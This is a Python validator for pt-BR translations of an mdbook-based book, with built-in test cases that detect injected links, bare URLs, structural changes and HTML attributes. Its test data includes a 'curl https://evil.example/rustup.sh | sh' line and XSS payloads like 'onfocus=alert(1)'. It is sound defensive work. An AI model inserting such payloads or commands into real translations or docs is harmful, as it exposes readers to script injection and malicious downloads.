    ("estrutura", None, "# Title\ntext", "# Título\ntexto", "marcador que o msgid também tem"),
    ("estrutura", None, "Is C# fun?", "C# é divertido?", "'#' no meio da linha"),
    ("estrutura", "erro", "Each value has an _owner_.", "# Cada valor tem um _dono_.", "msgstr vira título"),
    ("estrutura", "erro", "Each value has an _owner_.", "    Cada valor tem um _dono_.", "recuo de 4 espaços vira bloco de código"),
    ("estrutura", "erro", "Each value has an _owner_.", "> Cada valor tem um _dono_.", "msgstr vira citação"),
    ("estrutura", "erro", "Each value has an _owner_.", "1. Cada valor tem um _dono_.", "msgstr vira lista numerada"),
    ("estrutura", "erro", "Each value has an _owner_.", "- Cada valor tem um _dono_.", "msgstr vira item de lista"),
    ("estrutura", "erro", "Each value has an _owner_.", "Cada valor tem um _dono_.\n---", "linha de traços vira título setext"),
    ("estrutura", "erro", "Each value has an _owner_.", "Cada valor\n\ntem um _dono_.", "parágrafo partido em dois"),
    ("estrutura", "erro", "Each value has an _owner_.", "Cada valor\n\n- tem um _dono_.", "parágrafo e lista"),
    ("estrutura", "erro", "Each value has an _owner_.", "Cada valor\n```\ntem um _dono_.", "cerca de código sem fechamento"),
    ("estrutura", None, "Use <span\nclass=\"x\">a</span> here.", "Use <span\nclass=\"x\">a</span> aqui.",
     "tag de várias linhas que o msgid também tem"),
    ("estrutura", "erro", "Press <kbd>Ctrl</kbd> now.", "Pressione <kbd>Ctrl</kbd\n> # x {tabindex=0 onfocus=alert(1)}",
     "citação e título atrás de uma quebra de linha dentro da tag de fechamento"),
    ("estrutura", "erro", "A plain sentence with `a b`.", "Uma frase com `a\n- b`.",
     "item de lista no começo de uma linha de dentro de um código inline"),
    # definicoes: (a) a (e) da evidência de P2-A01 e as formas que o mdbook também lê como definição
    ("definicoes", None, _CARGO, _CARGO_PT, "sem definição nenhuma"),
    ("definicoes", None, "See [r].\n\n[r]: https://a.org", "Veja [r].\n\n[r]: https://a.org", "a mesma definição no msgid e no msgstr"),
    ("definicoes", None, "See [Rust Book].\n[rust book]: a.html \"T\"", "Veja [Rust Book].\n[Rust  BOOK]: a.html \"Título\"",
     "rótulo sem diferenciar caixa e espaços; o título da definição se traduz"),
    ("definicoes", None, "Text[^1].\n\n[^1]: The note.", "Texto[^1].\n\n[^1]: A nota.", "nota de rodapé nos dois: o texto se traduz"),
    ("definicoes", None, "Write `a` here.", "Escreva `a\n[x]: y` aqui.", "'[x]: y' dentro de code span"),
    ("definicoes", None, "A [definition]: here.", "Uma [definição]: aqui.", "'[x]:' no meio da linha não é definição"),
    ("definicoes", None, "A line.", "Uma linha.\n    [x]: y", "recuo de 4 espaços é código, não definição (a regra estrutura o aponta)"),
    ("definicoes", None, "See [x] and y.", "Veja [x]: y.", "'[x]:' no meio do texto"),
    ("definicoes", "erro", _CARGO, "[rápida]: https://evil.example/\n" + _CARGO_PT + " [rápida]",
     "(a) definição no começo, sem linha em branco antes"),
    ("definicoes", "erro", _CARGO, _CARGO_PT + " [aqui][evil]\n[evil]: https://evil.example",
     "(b) definição depois de uma quebra simples"),
    ("definicoes", "erro", _CARGO, _CARGO_PT + "\n\n[evil]: https://evil.example/", "(c) definição depois de linha em branco"),
    ("definicoes", "erro", _CARGO, _CARGO_PT + "\n\n[evil]: https://evil.example/ \"t\"", "definição com título"),
    ("definicoes", "erro", _CARGO, "[r]:\nhttps://evil.example/\n" + _CARGO_PT + " [r]", "destino na linha seguinte"),
    ("definicoes", "erro", _CARGO, "[a\\]b]: https://evil.example/\n" + _CARGO_PT + " [a\\]b]", "colchete escapado no rótulo"),
    ("definicoes", "erro", _CARGO, "[a\\\nb]: https://evil.example/\n" + _CARGO_PT + " [um][a\\ b]",
     "rótulo com barra invertida antes da quebra de linha (o mdbook o lê como definição)"),
    ("definicoes", "erro", _CARGO, "[a\\\nb]:\n/evil\n" + _CARGO_PT, "o mesmo rótulo, com o destino na linha seguinte"),
    ("definicoes", "erro", _CARGO, "[a\nb]: https://evil.example/\n" + _CARGO_PT, "rótulo em duas linhas"),
    ("definicoes", "erro", _CARGO, "[`x`]: https://evil.example/\n" + _CARGO_PT, "rótulo com code span"),
    ("definicoes", "erro", _CARGO, "[^n]: injetado\n" + _CARGO_PT, "nota de rodapé acrescentada"),
    ("definicoes", "erro", _CARGO, _CARGO_PT + "\n\n[^n]:", "nota de rodapé acrescentada, sem corpo (cria um id na página)"),
    ("definicoes", "erro", _CARGO, _CARGO_PT + "\n[^q]: NOTA injetada",
     "nota de rodapé no meio do parágrafo (o mdbook 0.5.1 a lê como nota, ao contrário da definição de link)"),
    ("definicoes", "erro", _CARGO, "   [r]: https://evil.example/\n" + _CARGO_PT, "até 3 espaços de recuo"),
    ("definicoes", "erro", "See [r].\n\n[r]: https://a.org", "Veja [r].\n\n[r]: https://evil.example",
     "mesmo rótulo com outro destino"),
    # url_nua
    ("url_nua", None, _CARGO, _CARGO_PT, "sem URL nua"),
    ("url_nua", None, "Visit https://rust-lang.org.", "Visite https://rust-lang.org, por favor.", "URL que o msgid também tem (pontuação final diferente)"),
    ("url_nua", None, "See [the site](https://rust-lang.org/learn).", "Veja o site (https://rust-lang.org/learn).",
     "URL que o msgid usa como destino e o msgstr repete no texto"),
    ("url_nua", None, "Run `curl https://rust-lang.org`.", "Execute `curl https://evil.example`.", "URL dentro de code span não conta"),
    ("url_nua", None, "See <https://rust-lang.org>.", "Veja <https://evil.example>.", "autolink não conta (a regra links o aponta)"),
    ("url_nua", None, 'See <a href="https://rust-lang.org">it</a>.', 'Veja <a href="https://evil.example">ele</a>.',
     "atributo de tag não conta (a regra atributos_html o aponta)"),
    ("url_nua", "aviso", _CARGO, _CARGO_PT + " Veja https://evil.example/", "(e) URL nua acrescentada"),
    ("url_nua", "aviso", _CARGO, _CARGO_PT + "\n\n    curl https://evil.example/rustup.sh | sh", "(d) comando com URL em bloco recuado"),
    ("url_nua", "aviso", "Visit https://rust-lang.org.", "Visite https://rust-lang.org/outro.", "URL diferente da do msgid"),
    ("url_nua", "aviso", _CARGO, _CARGO_PT + " Veja HTTPS://EVIL.example/x", "esquema em maiúsculas (HTTPS://)"),
    ("url_nua", None, "Visit HTTPS://rust-lang.org.", "Visite HTTPS://rust-lang.org.", "URL em maiúsculas que o msgid também tem"),
    # vazio
    ("vazio", "erro", "Hello there.", "   ", "só espaços"),
    ("vazio", "erro", "Hello there.", "\n", "só quebra de linha"),
    ("vazio", "erro", "Hello there.", "\u200b", "só espaço de largura zero"),
    ("vazio", "erro", "Hello there.", " \u2060\ufeff\u00ad ", "só invisíveis e espaços (word joiner, BOM, soft hyphen)"),
    ("vazio", "erro", "Hello there.", "\u3164\u2800", "só preenchimentos em branco"),
    ("vazio", None, "Hello there.", "Olá\u200b.", "invisível no meio de um texto não esvazia o msgstr"),
    ("vazio", None, "Hello there.", "", "msgstr vazio = não traduzido, nada a validar"),
    ("vazio", None, "Hello there.", "Olá.", "texto normal"),
]

# Verificações de comportamento geral: devolve a lista de falhas (vazia se tudo passou).
def _verifica_geral():
    falhas = []

    def confere(descricao, condicao):
        if not condicao:
            falhas.append(descricao)

    # 1000 colchetes aninhados (e 200 mil) não levantam RecursionError
    for n in (1000, 200000):
        profundo = "[" * n + "x" + "](u)" * 1 + "]" * n
        try:
            r = validar_par("Texto com colchetes [a](b).", "Texto " + profundo)
            confere(f"{n} colchetes aninhados devolvem lista", isinstance(r, list))
        except Exception as exc:
            falhas.append(f"{n} colchetes aninhados levantaram {type(exc).__name__}")
    r = validar_par("a [b](c) d", "[" * 1000 + "z" + "]" * 1000)
    confere("1000 colchetes aninhados sem destino: link ausente é erro", any(s == "erro" for s, _ in r))
    # parênteses e crases desbalanceados em quantidade
    for texto in ("(" * 5000, "`" * 5001, "<a " * 3000, "[a]" * 3000, "*_" * 3000, "{#" * 2000,
                  "\n[a" * 20000, "[a]:\n" * 5000, "https://" * 5000, "<div " * 5000, "<a@" * 5000,
                  "<" + "a" * 50000 + "@b", "<a@" + "b" * 50000, "[a][b](" * 5000, "{" + "} " * 20000,
                  "{}" + " " * 100000 + "x", "{}  " * 20000, "{} {#" + "a" * 100000, "{}\n" * 20000,
                  "&#32;" * 50000, "{" + "&#125;" * 20000, "&" * 100000, "&#" * 50000, "&#x" * 30000,
                  "&a" * 50000 + "{x}", "{" + "&rcub;&#32;" * 20000 + "x"):
        try:
            validar_par("Hello there my friend.", texto)
        except Exception as exc:
            falhas.append(f"entrada patológica levantou {type(exc).__name__}")
    # tipos estranhos
    for a, b in ((None, None), ("x", None), (None, "x"), (5, 7), ("", ""), ("", "x"), ("x", "")):
        try:
            confere("entradas estranhas devolvem lista", isinstance(validar_par(a, b), list))
        except Exception as exc:
            falhas.append(f"validar_par({a!r}, {b!r}) levantou {type(exc).__name__}")
    # mensagens nunca vazam marcadores internos, NUL nem surrogate
    r = validar_par("Use `a` e `b` [x](y).", "Use \x00 \ud800 \ue100 `c` [z](w).")
    for _sev, msg in r:
        confere("mensagem sem caracteres perigosos", not _RE_CARACTERES_RUINS.search(msg)
                and not _RE_PRIVADO.search(msg))
        try:
            msg.encode("utf-8")
        except UnicodeEncodeError:
            falhas.append("mensagem não codificável em UTF-8")
    confere("surrogate isolado vira erro 'caracteres'", ("erro" in [s for s, _ in r]))
    # mensagem de `referencias` mostra o rótulo como o autor escreveu (com caixa e código inline)
    r = validar_par("See [`String`] here.", "Veja [o tipo `String`] aqui.")
    confere("referencias: mostra [`String`] e não o rótulo normalizado",
            len(r) == 1 and "[`String`]" in r[0][1] and "«`string`»" not in r[0][1])
    r = validar_par("See [Translations] here.", "Veja [traduções] aqui.")
    confere("referencias: mantém a caixa original do rótulo", len(r) == 1 and "[Translations]" in r[0][1])
    r = [m for rg, _sv, m in _validar("Hash tables[^siphash]<!-- ignore -->.", "Tabelas hash<!-- ignore -->.")
         if rg == "referencias"]
    confere("referencias: dica de nota de rodapé em vez de [texto][rótulo]",
            len(r) == 1 and "[^siphash]" in r[0] and "nota de rodapé" in r[0]
            and "[texto traduzido][rótulo]" not in r[0])
    # mensagem de `definicoes` cita o rótulo e o destino novo; a de `url_nua`, a URL
    r = [m for rg, _sv, m in _validar(_CARGO, "[rápida]: https://evil.example/\n" + _CARGO_PT + " [rápida]")
         if rg == "definicoes"]
    confere("definicoes: cita a definição e o destino novo",
            len(r) == 1 and "«[rápida]: https://evil.example/»" in r[0] and "destino novo" in r[0])
    r = [m for rg, _sv, m in _validar(_CARGO, _CARGO_PT + " Veja https://evil.example/.") if rg == "url_nua"]
    confere("url_nua: cita a URL sem a pontuação final", len(r) == 1 and "«https://evil.example/»" in r[0])
    # `definicoes` separa a definição de link (começo ou linha em branco) da nota de rodapé (qualquer linha)
    r = [m for rg, _sv, m in _validar(_CARGO, _CARGO_PT + "\n[^q]: NOTA") if rg == "definicoes"]
    confere("definicoes: o texto distingue o link da nota de rodapé",
            len(r) == 1 and "depois de linha em branco" in r[0] and "qualquer começo de linha" in r[0]
            and "em qualquer posição" not in r[0])
    r = [m for rg, _sv, m in _validar("See the book.", "Veja [o livro][book].") if rg == "referencias"]
    confere("referencias: o aviso de rótulo novo só exceta a nota de rodapé",
            len(r) == 1 and "a não ser que" not in r[0] and "`[^n]`" in r[0])
    # legenda do <Listing>: o achado leva o nome da regra do texto, o prefixo da legenda e o destino novo
    r = [(rg, sv, m) for rg, sv, m in _validar(_LISTING, _listing_com("Lê um `guess` [aqui](https://evil.example/cap)"))]
    confere("legenda: link acrescentado é um erro da regra links que cita a legenda e o destino",
            len(r) == 1 and r[0][:2] == ("links", "erro") and "na legenda (caption=)" in r[0][2]
            and "«https://evil.example/cap»" in r[0][2])
    # título com atributos e tag de bloco malformada na legenda: a regra do texto, o prefixo da legenda e o trecho
    r = _validar(_LISTING, _listing_com("# Lê um `guess` {tabindex=0 onfocus=alert(1)}"))
    confere("legenda: título com atributos é um erro da regra estrutura que cita a legenda e o título",
            len(r) == 1 and r[0][:2] == ("estrutura", "erro") and "na legenda (caption=)" in r[0][2]
            and "título (#)" in r[0][2])
    r = _validar(_LISTING, _listing_com("<div =x onmouseover=alert(2)> Lê um `guess`"))
    confere("legenda: tag de bloco malformada é um erro da regra html_bloco que cita a tag",
            len(r) == 1 and r[0][:2] == ("html_bloco", "erro") and "na legenda (caption=)" in r[0][2]
            and "«<div»" in r[0][2])
    r = _validar("Hello there.", "Olá. <fulano@evil.example>")
    confere("autolink de e-mail acrescentado é um erro da regra links que cita o endereço",
            len(r) == 1 and r[0][:2] == ("links", "erro") and "«fulano@evil.example»" in r[0][2])
    # bloco `{...}` no fim da linha: um erro da regra slug que cita o bloco; o que o msgid já tem não conta
    r = _validar("Processing a Guess", "Processando um palpite {onfocus=x}")
    confere("slug: bloco no fim da linha é um erro que cita o bloco e o fim da linha",
            len(r) == 1 and r[0][:2] == ("slug", "erro") and "{onfocus=x}" in r[0][2] and "no fim da linha" in r[0][2])
    r = _validar("Processing a Guess", "A {a}\nB {b}\nC {c}\nD {d}\nE {e}")
    confere("slug: muitos blocos no fim da linha saem no máximo três, mais o total",
            len(r) == _MAX_SLUGS_RELATADOS + 1 and "e mais 2 bloco(s)" in r[-1][2])
    r = _validar("Processing a Guess", "Processando um palpite {onfocus=x&#125;")
    confere("slug: bloco fechado por referência de caractere é um erro que cita o bloco já decodificado",
            len(r) == 1 and r[0][:2] == ("slug", "erro") and "{onfocus=x}" in r[0][2])
    r = _validar("Using `x{`", "Usando `x{` onfocus=alert(1)}")
    confere("slug: bloco aberto por `{` de dentro de código cita o código",
            len(r) == 1 and r[0][:2] == ("slug", "erro") and "{` onfocus=alert(1)}" in r[0][2])
    # mais de 6.900 trechos opacos: os últimos perdem o texto original, mas o `{` possível deles ainda abre bloco
    r = _validar("Processing a Guess", "`a` " * (_ULTIMO_MARCADOR - _PRIMEIRO_MARCADOR + 100) + "`x{` onfocus=alert(1)}")
    confere("slug: código além do teto de marcadores ainda abre bloco",
            any(rg == "slug" and sv == "erro" and "no fim da linha" in m for rg, sv, m in r))
    r = _validar("Processing a Guess", "Processando um palpite {onfocus=\x00 `x`}")
    confere("slug: a mensagem do bloco escapa o NUL, mostra o código e não vaza marcador",
            any(rg == "slug" and "\\x00" in m and "`x`" in m for rg, _sv, m in r)
            and not any(_RE_CARACTERES_RUINS.search(m) or _RE_PRIVADO.search(m) for _rg, _sv, m in r))
    # legendas reais (code spans com genéricos) e a tradução de sempre não têm nenhum achado
    r = validar_par('<Listing number="15-4" file-name="src/main.rs" caption="Using `Vec<T>` and `Rc<RefCell<i32>>`">\n',
                    '<Listing number="15-4" file-name="src/main.rs" caption="Usando `Vec<T>` e `Rc<RefCell<i32>>`">\n')
    confere("legenda: tradução normal com code spans não tem achado", r == [])
    # caractere privado natural não confunde os marcadores
    confere("caractere privado no texto não quebra códigos",
            not [1 for rg, sv, _ in _validar("Use `a`.", "Use \ue100 `a`.") if rg == "code_spans"])
    # mensagem de `atributos_html` mostra o atributo sem valor como no HTML (sem `=`)
    r = validar_par('Press <input disabled name="a"> now.', 'Pressione <input name="a"> agora.')
    confere("atributos_html: atributo sem valor aparece como <input disabled>",
            len(r) == 1 and "«<input disabled>»" in r[0][1] and "disabled=" not in r[0][1])
    # falha ao analisar a mensagem: erro da regra 'interno', sem levantar exceção
    analise = globals()["_Analise"]

    def quebrada(texto):
        raise ValueError("falha simulada")

    globals()["_Analise"] = quebrada
    try:
        r = _validar("Hello there.", "Olá.")
    except Exception as exc:
        r = []
        falhas.append(f"falha ao analisar levantou {type(exc).__name__}")
    finally:
        globals()["_Analise"] = analise
    confere("falha ao analisar vira erro da regra 'interno'",
            [(rg, sv) for rg, sv, _ in r] == [(_REGRA_INTERNA, "erro")])
    # fuzz determinístico: nunca levanta, sempre devolve pares (str, str)
    azar = random.Random(1)
    pecas = ["`", "``", "[", "]", "(", ")", "<", ">", "<!-- ignore -->", "{#", "}", "_", "*", "\\", "](", "<Listing ",
             'caption="', '"', "1.0", "0.10.1", "2026-08-20", "{{#include x}}", "\n", " ", "texto ", "https://x.org"]
    for _ in range(400):
        a = "".join(azar.choice(pecas) for _ in range(azar.randint(0, 25)))
        b = "".join(azar.choice(pecas) for _ in range(azar.randint(0, 25)))
        try:
            r = validar_par(a, b)
            confere("fuzz devolve pares de str", all(isinstance(s, str) and isinstance(m, str) for s, m in r))
        except Exception as exc:
            falhas.append(f"fuzz levantou {type(exc).__name__} em {a!r}, {b!r}")
            break
    # run(ctx): rebaixa fuzzy e usa Achado de checks.base
    falhas.extend(_verifica_run())
    return falhas


def _po_de_teste():
    """(po, ctx) com as entradas que exercitam run() e a varredura (ImportError sem polib ou base.py)."""
    import polib
    from checks.base import Contexto

    def entrada(msgid, msgstr, origens, fuzzy=False):
        return polib.POEntry(msgid=msgid, msgstr=msgstr, flags=["fuzzy"] if fuzzy else [],
                             occurrences=[(o, "") for o in origens])

    cap = ["src/ch04-01-x.md"]
    sumario = ["src/SUMMARY.md", "src/ch03-02-x.md"]
    po = polib.POFile()
    po.append(entrada("Use `a` here.", "Use `b` aqui.", cap))                    # erro
    po.append(entrada("Use `a` there.", "Use `b` lá.", cap, fuzzy=True))         # aviso [fuzzy]
    po.append(entrada("Use `a` now.", "", cap))                                  # vazia: fora
    po.append(entrada("Use `a` ok.", "Use `a` ok.", cap))                        # certa: sem achado
    po.append(entrada("Data Types", "Tipos `bug` {#data-types}", sumario, fuzzy=True))   # fuzzy no sumário: erro
    po.append(entrada("Use `a` where.", "Use `b` onde.", ["src/SUMMARY.md"] + cap))      # arquivo fora do sumário
    return po, Contexto(".", "x.po", po)


def _verifica_run():
    try:
        po, ctx = _po_de_teste()
    except Exception as exc:                       # polib e checks/base.py são obrigatórios
        return [f"run(ctx) não testado: {type(exc).__name__}: {exc}"]
    falhas = []
    try:
        achados = [a for a in run(ctx) if a.check == NOME]
    except Exception as exc:
        return [f"run(ctx) levantou {type(exc).__name__}: {exc}"]
    sev = [a.severidade for a in achados]
    if sev != ["erro", "aviso", "erro", "erro"]:
        falhas.append(f"run(ctx): severidades inesperadas {sev}")
        return falhas
    prefixos = [re.match(r"\[\w+\] (\[[^\]]*\] )?", a.mensagem) for a in achados]
    marcas = [m.group(1) if m else "?" for m in prefixos]
    if marcas != [None, "[fuzzy] ", "[fuzzy, aparece no menu] ", None]:
        falhas.append(f"run(ctx): marca [fuzzy] fora do lugar ou ausente: {marcas}")
    if [a.arquivo for a in achados] != ["src/ch04-01-x.md", "src/ch04-01-x.md", "src/ch03-02-x.md", "src/ch04-01-x.md"]:
        falhas.append(f"run(ctx): arquivo escolhido errado {[a.arquivo for a in achados]}")
    # a varredura do modo script rebaixa e conta do mesmo jeito que run()
    total, por_regra = _examina(po)
    contagem = {sv: sum(len(v) for (rg, s2), v in por_regra.items() if s2 == sv) for sv in ("erro", "aviso")}
    if total != 5 or contagem != {"erro": 3, "aviso": 1}:
        falhas.append(f"varredura: total {total} e achados {contagem} diferem do run(ctx)")
    return falhas


def autoteste():
    """Roda CASOS e as verificações gerais; devolve 0 se tudo passou, 1 senão."""
    falhas = []
    positivos = Counter()
    negativos = Counter()
    for regra, esperado, msgid, msgstr, descricao in CASOS:
        achados = [(sv, msg) for rg, sv, msg in _validar(msgid, msgstr) if rg == regra]
        if esperado is None:
            negativos[regra] += 1
            if achados:
                falhas.append(f"[{regra}] {descricao}: não deveria apontar, mas apontou {achados}")
        else:
            positivos[regra] += 1
            if (esperado, ) != tuple(sorted({sv for sv, _ in achados})):
                falhas.append(f"[{regra}] {descricao}: esperava {esperado}, obteve {achados or 'nada'}")
    for regra in REGRAS:
        if not positivos[regra]:
            falhas.append(f"regra {regra} sem caso positivo")
        if not negativos[regra]:
            falhas.append(f"regra {regra} sem caso negativo")
    falhas.extend(_verifica_geral())
    if falhas:
        print(f"autoteste: FALHOU ({len(falhas)} problema(s))", file=sys.stderr)
        for f in falhas:
            print("  - " + f, file=sys.stderr)
        return 1
    print(f"autoteste: ok ({len(CASOS)} casos, {len(REGRAS)} regras)")
    return 0


# --------------------------------------------------------------------------
# Linha de comando
# --------------------------------------------------------------------------

_TRADUCOES_ERRO = (
    (re.compile(r"^unrecognized arguments: (.*)$", re.S), r"argumentos não reconhecidos: \1"),
    (re.compile(r"^expected one argument$"), "esperava um argumento"),
    (re.compile(r"^invalid (\w+) value: (.*)$", re.S), r"valor \1 inválido: \2"),
    (re.compile(r"^ambiguous option: (.*) could match (.*)$", re.S), r"opção ambígua: \1 pode ser \2"),
)


def _traduz_erro(mensagem):
    m = re.match(r"^argument (.*?): (.*)$", mensagem, re.S)
    if m:
        return f"argumento {m.group(1)}: {_traduz_erro(m.group(2))}"
    for padrao, troca in _TRADUCOES_ERRO:
        if padrao.match(mensagem):
            return padrao.sub(troca, mensagem)
    return mensagem


class _Ajuda(argparse.RawDescriptionHelpFormatter):
    def add_usage(self, usage, actions, groups, prefix=None):
        return super().add_usage(usage, actions, groups, prefix="uso: " if prefix is None else prefix)


class _Parser(argparse.ArgumentParser):
    def error(self, message):
        self.print_usage(sys.stderr)
        print(f"{self.prog}: erro: {_traduz_erro(message)}", file=sys.stderr)
        sys.exit(2)


def _examina(po):
    """Valida as entradas com msgstr do PO (só leitura).

    Devolve (total, {(regra, severidade): [(entrada, fuzzy, mensagem)]}), com a severidade que o
    check.py daria (`_como_no_livro`): o 'erro' de uma entrada fuzzy vira 'aviso'.
    """
    por_regra = {}
    total = 0
    for e in po:
        if e.obsolete or not e.msgid or e.msgstr == "":
            continue
        total += 1
        fuzzy = "fuzzy" in e.flags
        for regra, sev, msg in _validar(e.msgid, e.msgstr):
            sev, msg = _como_no_livro(e, sev, msg)
            por_regra.setdefault((regra, sev), []).append((e, fuzzy, msg))
    return total, por_regra


def _imprime_varredura(caminho, ctx, total, por_regra, exemplos):
    print(f"{caminho}: {total} entradas com msgstr (traduzidas e fuzzy) examinadas")
    if not por_regra:
        print("nenhum achado")
        return
    ordem = {r: i for i, r in enumerate(REGRAS)}      # regra fora de REGRAS ('interno') vai para o fim
    for (regra, sev), itens in sorted(por_regra.items(),
                                      key=lambda kv: (kv[0][1] != "erro", ordem.get(kv[0][0], len(REGRAS)))):
        n_fuzzy = sum(1 for _e, fuzzy, _m in itens if fuzzy)
        print(f"\n{regra} [{sev}]: {len(itens)} achado(s)"
              + (f" ({n_fuzzy} em entradas fuzzy)" if n_fuzzy else ""))
        for e, fuzzy, msg in itens[:exemplos]:
            print(f"  - {po_util.entry_id(e)}{' (fuzzy)' if fuzzy else ''} {ctx.arquivo_de(e) or '(sem origem)'}")
            print(f"      msgid : {_mostra(e.msgid, 110)}")
            print(f"      msgstr: {_mostra(e.msgstr, 110)}")
            print(f"      motivo: {_mostra(msg, 220)}")
    erros = sum(len(v) for (_r, sev), v in por_regra.items() if sev == "erro")
    avisos = sum(len(v) for (_r, sev), v in por_regra.items() if sev == "aviso")
    print(f"\nresumo: {erros} erro(s) e {avisos} aviso(s)")


def _varre_po(caminho, exemplos):
    """Valida as entradas traduzidas e fuzzy do PO (só leitura) e imprime o resumo por regra.

    Devolve 0 sem 'erro', 1 com 'erro' e 2 se o PO não puder ser lido. O código vem da validação,
    não da saída: um `| head` que fecha o cano antes do fim não o muda.
    """
    from checks.base import Contexto        # import tardio (CONTRATO §6): só a varredura usa

    caminho = Path(caminho)
    if caminho.is_dir():
        print(f"erro: o caminho do PO é um diretório, não um arquivo: {caminho}", file=sys.stderr)
        return 2
    try:
        po = po_util.carregar(caminho)
    except FileNotFoundError as exc:                  # a mensagem já traz o caminho
        print(f"erro: {exc}", file=sys.stderr)
        return 2
    except UnicodeError as exc:
        print(f"erro: o PO {caminho} não está em UTF-8 válido: {exc}", file=sys.stderr)
        return 2
    except (OSError, ValueError) as exc:
        print(f"erro: não consegui ler o PO {caminho} (malformado ou ilegível): {exc}", file=sys.stderr)
        return 2
    total, por_regra = _examina(po)
    erros = sum(len(v) for (_r, sev), v in por_regra.items() if sev == "erro")
    try:
        _imprime_varredura(caminho, Contexto(po_util.RAIZ, caminho, po), total, por_regra, exemplos)
        sys.stdout.flush()
    except BrokenPipeError:                  # saída canalizada para `head` etc.
        os.dup2(os.open(os.devnull, os.O_WRONLY), sys.stdout.fileno())
    return 1 if erros else 0


def main(argv=None):
    ap = _Parser(prog="mensagens.py", add_help=False, formatter_class=_Ajuda,
                 description="Valida pares msgid/msgstr do po/pt-BR.po (regras do CONTRATO.md §6).",
                 epilog="código de saída: 0 sem 'erro' (pode haver avisos); 1 com 'erro' na varredura ou\n"
                        "falha do --autoteste; 2 em uso incorreto ou PO ilegível. Como no check.py, o\n"
                        "'erro' de uma entrada fuzzy vira 'aviso', salvo nas do src/SUMMARY.md.")
    ap._positionals.title = "argumentos posicionais"
    ap._optionals.title = "opções"
    ap.add_argument("-h", "--help", action="help", help="mostra esta ajuda e sai")
    ap.add_argument("--autoteste", action="store_true",
                    help="roda os casos de teste embutidos (não se combina com --po nem --exemplos)")
    ap.add_argument("--po", metavar="ARQ.po", default=None,
                    help="PO a examinar, só leitura (padrão: po/pt-BR.po)")
    ap.add_argument("--exemplos", type=int, default=None, metavar="N",
                    help="exemplos por regra e severidade (padrão: 2; 0 ou negativo oculta os exemplos)")
    args = ap.parse_args(argv)
    if args.autoteste:
        if args.po is not None or args.exemplos is not None:
            ap.error("--autoteste não se combina com --po nem com --exemplos")
        return autoteste()
    if args.po is not None and not args.po.strip():       # variável de shell vazia não cai no PO padrão
        ap.error("--po: informe o caminho do PO")
    caminho = po_util.PO_PADRAO if args.po is None else args.po
    return _varre_po(caminho, 2 if args.exemplos is None else max(args.exemplos, 0))


if __name__ == "__main__":
    sys.exit(main())
